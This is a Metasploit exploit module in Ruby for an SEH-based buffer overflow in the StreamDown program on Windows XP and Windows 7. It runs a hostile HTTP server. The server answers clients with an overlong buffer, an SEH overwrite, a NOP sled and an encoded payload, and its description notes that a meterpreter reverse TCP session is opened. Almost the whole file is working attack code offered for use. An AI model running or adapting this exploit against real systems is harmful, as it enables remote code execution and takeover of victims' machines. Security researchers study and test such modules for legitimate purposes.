##
# $Id: stream_down_BOF.rb 1 2011-12-18 $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking
	include Msf::Exploit::Remote::HttpServer
	
	def initialize
			super(
					'Name'           => 'StreamDown Buffer over flow universal exploit',
					'Version'        => '$Revision: 1 $',
					'Description'    => 'Stream Down Buffer Overflow universal exploit tested against win xp sp3 and win7 sp1. Also note that the program will not crash in case of meterpreter reverse tcp payload but a session will be opened',
					'Author'         => 'Fady Mohamed Osman',
					'References'	 => 
						[
								['URL', 'http://www.dark-masters.tk/']
						],
					'Privileged'     => false,
					'DefaultOptions' =>
						{
							'EXITFUNC' => 'seh',
							'InitialAutoRunScript' => 'migrate -f'
						},
					'Payload'        =>
						{
							'BadChars' => "\x00\xff\x0a"
						},
					'Platform'       => 'win',
					'Targets'        =>
						[
							[ 'Automatic',  { } ],
						],
					'DefaultTarget' => 0,
					'License'        => MSF_LICENSE
                )
	end
	def on_request_uri(cli,request)
		seh = 0x10019448
		nseh = "\xeb\x06\x90\x90"
		sploit = "A"*16388 + nseh + [seh].pack('V') + "\x90"*10 + payload.encoded 
		cli.put(sploit)
		close_client(cli)
	end
end
